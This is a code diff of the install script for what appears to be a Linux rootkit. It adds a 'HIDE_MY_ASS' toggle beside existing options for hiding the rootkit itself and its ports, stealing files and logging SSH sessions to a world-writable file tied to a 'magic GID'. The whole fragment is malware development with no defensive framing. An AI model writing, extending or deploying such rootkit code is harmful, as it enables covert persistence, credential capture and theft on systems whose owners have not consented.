@@ -22,7 +22,7 @@ dlfile(){ # $1 = src, $2 = dest
 }
 mktouch(){ mkdir -p `dirname "$1"` && touch "$1"; }
 USE_CRYPT=0; HIDE_SELF=0; HIDE_PORTS=0; FILE_STEAL=0; LOG_SSH=0; READ_GID_FROM_FILE=0
-AUTO_GID_CHANGER=0
+AUTO_GID_CHANGER=0; HIDE_MY_ASS=0
 read_toggles(){ # $1 = path of conf
     local conf="$1"
     [ ! -f "$conf" ] && { echo "specified file doesn't exist. exiting."; exit; }
@@ -34,6 +34,7 @@ read_toggles(){ # $1 = path of conf
         [ "$line" == 'LOG_SSH=1' ] && LOG_SSH=1
         [ "$line" == 'READ_GID_FROM_FILE=1' ] && READ_GID_FROM_FILE=1
         [ "$line" == 'AUTO_GID_CHANGER=1' ] && AUTO_GID_CHANGER=1
+        [ "$line" == 'HIDE_MY_ASS=1' ] && HIDE_MY_ASS=1
     done <<< "`cat $conf`"
 }
 install_deps(){
@@ -163,6 +164,7 @@ echo 'moving some files'
 [ $LOG_SSH == 1 ] && { mktouch $SSH_LOGS && chmod 666 $SSH_LOGS && ln -s $SSH_LOGS $INSTALL_DIR/ssh_logs; }
 [ $READ_GID_FROM_FILE == 1 ] && { mktouch $GID_PATH && chmod 644 $GID_PATH && cat $INCLUDE_DIR/magic_gid > $GID_PATH; }
 [ $AUTO_GID_CHANGER == 1 ] && { mktouch $GIDTIME_PATH && chmod 644 $GIDTIME_PATH; }
+[ $HIDE_MY_ASS == 1 ] && touch $INSTALL_DIR/my_ass
 rm -r $INCLUDE_DIR
 
 if [ $HIDE_SELF == 1 ]; then
